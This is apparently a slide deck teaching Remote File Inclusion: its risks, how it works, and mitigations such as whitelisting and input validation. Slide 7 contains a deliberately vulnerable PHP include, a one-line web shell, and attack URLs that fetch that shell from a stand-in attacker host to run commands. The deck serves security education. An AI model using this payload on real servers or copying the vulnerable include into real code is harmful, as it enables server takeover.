# File Inclusion - RFI

_Category: Common Web Attacks / File Inclusion — Source: https://www.canva.com/design/DAGm2UxMd9M/ue0Bbwt9VmJKkh0rbVeQgw/edit_

---

## Slide 1

FILE INCLUSION - RFI

REMOTE FILE INCLUSION

File Inclusion - RFI

Remote File Inclusion

## Slide 2

REMOTE FILE INCLUSION (RFI)

Remote File Inclusion (RFI) is a web vulnerability that occurs when user input is used to dynamically include a file from an external server.

If the application doesn't validate or sanitize the input properly, an attacker can supply a malicious URL to a script that will be fetched and executed by the vulnerable server.

Remote File Inclusion (RFI)

Remote File Inclusion (RFI) is a web vulnerability that occurs when user input is used to dynamically include a file from an external server.

If the application doesn't validate or sanitize the input properly, an attacker can supply a malicious URL to a script that will be fetched and executed by the vulnerable server.

## Slide 3

THIS CAN LEAD TO

Remote Code Execution
(RCE)

Full server compromise

Backdoor installation

This can lead to

Remote Code Execution (RCE)

Full server compromise

Backdoor installation

## Slide 4

SIMPLE TERMS

RFI is like asking a hotel to print a document for you by giving them a web link — but
instead of checking if the link is safe, they just click it and print whatever is there, even
if it's full of dangerous or harmful content.

Simple Terms

RFI is like asking a hotel to print a document for you by giving them a web link — but instead of checking if the link is safe, they just click it and print whatever is there, even if it's full of dangerous or harmful content.

## Slide 5

IMPORTANCE OF LFI SECURITY

Execute Attacker-
Controlled Code

Lateral Network
Access

Persistence

Escalation

The attacker can
gain control of the
server.

Pivot into internal
networks via web
shell.

Upload backdoors
or shells.

Chain with other
vulnerabilities for
privilege escalation.

Importance of LFI Security

Execute Attacker-Controlled Code

Lateral Network Access

Persistence

Escalation

The attacker can gain control of the server.

Pivot into internal networks via web shell.

Upload backdoors or shells.

Chain with other vulnerabilities for privilege escalation.

## Slide 6

HOW LFI WORKS

The application takes a
page or file parameter
from the user.

That value is passed into a
file inclusion function (like
include() or require() in PHP).

The attacker provides
a remote URL, which is
fetched and included in
the app.

How LFI Works

The application takes a page or file parameter from the user.

That value is passed into a file inclusion function (like include() or require() in PHP).

The attacker provides a remote URL, which is fetched and included in the app.

## Slide 7

Vulnerable Code

Attacker Input

Result

Content of malicious.txt

The attacker runs OS commands remotely on the victim's server.

<?php

$page = $_GET['page'];

include($page); // Dangerous

?>

http://victim.com/index.php page=http://attacker.com/malicious.txt 

http://victim.com/index.php?page=http://attacker.com/malicious.txt&cmd=id

<?php system($_GET['cmd']); ?>

EXAMPLE

Example

Vulnerable Code

<?php

$page = $_GET['page'];

include($page); // Dangerous

?>

Content of malicious.txt

<?php system($_GET['cmd']); ?>

Attacker Input

http://victim.com/index.php page=http://attacker.com/malicious.txt

Result

http://victim.com/index.php?page=http://attacker.com/malicious.txt&cmd=id

The attacker runs OS commands remotely on the victim's server.

## Slide 8

MITIGATION STRATEGIES

Server-Side
Configuration

Enable Application-
Level Controls

Use a whitelist of
allowed file names.

NAME

Mitigation Strategies

name

Server-Side Configuration

Enable Application-Level Controls

Use a whitelist of allowed file names.

## Slide 9

MITIGATION STRATEGIES

Sanitize and validate
all inputs strictly.

Secure Coding
Practices

Avoid evaluating URLs
or untrusted input in
backend logic.

Mitigation Strategies

Sanitize and validate all inputs strictly.

Secure Coding Practices

Avoid evaluating URLs or untrusted input in backend logic.

## Slide 10

CONCLUSION

Remote File Inclusion (RFI) is a dangerous vulnerability that can allow an attacker to
take complete control over a web server. Strict input validation, safe configuration,
and secure coding practices are essential to mitigate this risk.

Conclusion

Remote File Inclusion (RFI) is a dangerous vulnerability that can allow an attacker to take complete control over a web server. Strict input validation, safe configuration, and secure coding practices are essential to mitigate this risk.

## Slide 11

Remote File Inclusion

Web Shell

Remote Code Execution

Command Injection

NEW TERMS

A vulnerability that allows inclusion of files from
external servers through user input.

The ability to run attacker-controlled code on
a victim machine or server.

A script that provides remote command
execution on the server through a web interface.

A type of attack that allows execution of
arbitrary system commands via vulnerable code.

New Terms

Remote File Inclusion

A vulnerability that allows inclusion of files from external servers through user input.

Web Shell

A script that provides remote command execution on the server through a web interface.

Remote Code Execution

The ability to run attacker-controlled code on a victim machine or server.

Command Injection

A type of attack that allows execution of arbitrary system commands via vulnerable code.
